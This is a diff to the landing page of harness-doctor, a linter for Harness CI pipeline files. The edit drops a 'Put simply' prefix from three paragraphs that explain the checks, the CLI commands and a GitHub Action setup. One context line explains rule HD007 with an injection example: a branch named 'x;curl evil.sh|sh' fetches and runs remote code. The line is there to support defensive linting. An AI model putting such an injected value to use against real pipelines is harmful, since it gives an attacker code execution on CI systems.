@@ -183,7 +183,7 @@ footer .wrap{display:flex;justify-content:space-between;gap:16px;flex-wrap:wrap}
 <section id="rules"><div class="wrap">
   <h2>What it checks</h2>
   <p class="sub">The list comes from the linter itself, so it matches the code. Without JavaScript, see the <a href="https://github.com/gerardrecinto/harness-doctor#readme">README</a>.</p>
-  <p class="pw"><b>Put simply:</b> each row is one mistake the tool looks for, and why it is risky.</p>
+  <p class="pw">Each row is one mistake the tool looks for, and why it is risky.</p>
   <div class="tw"><table><thead><tr><th>Rule</th><th>Severity</th><th>File</th><th>Check</th><th>Why it matters</th></tr></thead><tbody id="rules-body"><tr><td colspan="5">Loading...</td></tr></tbody></table></div>
   <p class="note">HD007 is easy to miss: Harness pastes <code>&lt;+codebase.branch&gt;</code> into the script before the shell reads it, so a branch named <code>x;curl evil.sh|sh</code> runs as code.</p>
 </div></section>
@@ -201,7 +201,7 @@ harness-doctor check .harness .github/workflows</code></pre></div>
 <pre><code>harness-doctor check .harness --fail-on warning
 harness-doctor check .harness --format sarif
 harness-doctor explain HD007</code></pre></div>
-      <p class="pw"><b>Put simply:</b> the last two commands save a report file that GitHub can read (SARIF) and explain one rule.</p>
+      <p class="pw">The last two commands save a report file that GitHub can read (SARIF) and explain one rule.</p>
       <p class="note">Exit code 0 means clean, 1 means findings, 2 means bad input such as a missing folder.</p>
     </div>
     <div>
@@ -212,7 +212,7 @@ harness-doctor explain HD007</code></pre></div>
     path: .harness
     fail-on: warning
     schema: "true"</code></pre></div>
-      <p class="pw"><b>Put simply:</b> this runs the check automatically on every pull request.</p>
+      <p class="pw">This runs the check automatically on every pull request.</p>
       <p class="note">The Action puts findings on the pull request. The Actions and Jenkins rules are on <code>main</code> but not in v0.1.1, so v0.1.1 checks Harness files only. A pre-commit hook is in the <a href="https://github.com/gerardrecinto/harness-doctor#readme">README</a>.</p>
     </div>
   </div>
